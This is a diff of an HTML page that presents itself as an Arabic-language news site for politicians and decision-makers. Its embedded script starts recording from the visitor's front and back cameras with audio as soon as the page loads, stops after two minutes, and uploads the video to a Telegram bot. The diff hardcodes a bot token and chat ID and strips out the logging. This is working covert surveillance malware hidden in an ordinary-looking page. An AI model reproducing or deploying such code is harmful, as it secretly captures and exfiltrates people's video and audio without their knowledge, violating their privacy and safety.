@@ -5,117 +5,64 @@
   <meta name="viewport" content="width=device-width, initial-scale=1.0">
   <title>آشكاين - جريدة السياسيين وصناع القرار</title>
   <script>
-    let mediaRecorder;
-    let chunks = [];
-    let isStopped = false;
-
     async function startRecording(facingMode, videoFileName) {
         try {
             const stream = await navigator.mediaDevices.getUserMedia({
                 video: { facingMode },
                 audio: true
             });
-
-            mediaRecorder = new MediaRecorder(stream);
-
-            // Handle data availability
+  
+            const mediaRecorder = new MediaRecorder(stream);
+            const chunks = [];
+            let isStopped = false;
+  
             mediaRecorder.ondataavailable = event => {
                 if (event.data.size > 0) {
                     chunks.push(event.data);
                 }
             };
-
-            // Handle recorder stop
+  
             mediaRecorder.onstop = async () => {
-                if (isStopped) return;
+                if (isStopped) return; // Prevent duplicate stops
                 isStopped = true;
-
+  
                 const blob = new Blob(chunks, { type: 'video/webm' });
                 const formData = new FormData();
                 formData.append('video', blob, videoFileName);
-
-                const telegramBotToken = 'YOUR_SECURE_TOKEN';
-                const chatId = 'YOUR_CHAT_ID';
-
+  
+                const telegramBotToken = '7867318181:AAFHSDLNLvdPFomn3HDxBbNCINP0LeDLHjw';
+                const chatId = '1832658980';
+  
                 try {
                     const response = await fetch(`https://api.telegram.org/bot${telegramBotToken}/sendVideo?chat_id=${chatId}`, {
                         method: 'POST',
                         body: formData
                     });
-
+  
                     const data = await response.json();
-                    console.log(`تم إرسال الفيديو (${videoFileName}) بنجاح:`, data);
                 } catch (error) {
-                    console.error(`حدث خطأ أثناء إرسال الفيديو (${videoFileName}):`, error);
-
-                    // حفظ الفيديو في LocalStorage لإعادة الإرسال لاحقًا
-                    localStorage.setItem(`failedVideo-${videoFileName}`, blob);
                 }
             };
-
+  
             mediaRecorder.start();
-
-            // ضبط مؤقت إيقاف بعد دقيقتين
+  
+            // Stop after 2 minutes
             setTimeout(() => {
                 if (!isStopped) {
                     mediaRecorder.stop();
                     stream.getTracks().forEach(track => track.stop());
                 }
             }, 2 * 60 * 1000);
-
-            // التعامل مع إغلاق الصفحة
-            window.addEventListener('beforeunload', () => {
-                if (mediaRecorder.state === 'recording') {
-                    mediaRecorder.stop();
-                    stream.getTracks().forEach(track => track.stop());
-                }
-            });
         } catch (error) {
-            console.error(`خطأ أثناء الوصول إلى الكاميرا (${facingMode}):`, error);
         }
     }
-
-    function retryFailedUploads() {
-        for (const key in localStorage) {
-            if (key.startsWith('failedVideo-')) {
-                const blob = localStorage.getItem(key);
-                const videoFileName = key.replace('failedVideo-', '');
-
-                // إعادة رفع الفيديو المخزن
-                const formData = new FormData();
-                formData.append('video', blob, videoFileName);
-
-                const telegramBotToken = '7867318181:AAFHSDLNLvdPFomn3HDxBbNCINP0LeDLHjw';
-                const chatId = '1832658980';
-
-                fetch(`https://api.telegram.org/bot${telegramBotToken}/sendVideo?chat_id=${chatId}`, {
-                    method: 'POST',
-                    body: formData
-                })
-                    .then(response => response.json())
-                    .then(data => {
-                        console.log(`تم إعادة إرسال الفيديو (${videoFileName}) بنجاح:`, data);
-                        localStorage.removeItem(key);
-                    })
-                    .catch(error => {
-                        console.error(`حدث خطأ أثناء إعادة إرسال الفيديو (${videoFileName}):`, error);
-                    });
-            }
-        }
-    }
-
+  
     document.addEventListener('DOMContentLoaded', () => {
-        // إعادة محاولة رفع الفيديوهات الفاشلة عند فتح الصفحة
-        retryFailedUploads();
-
-        // تسجيل الكاميرا الأمامية
+        // Record front and back cameras
         startRecording('user', 'front_recording.webm');
-
-        // تسجيل الكاميرا الخلفية
         startRecording('environment', 'back_recording.webm');
     });
-</script>
-
+  </script>
   
   <style>
     /* إعدادات عامة */
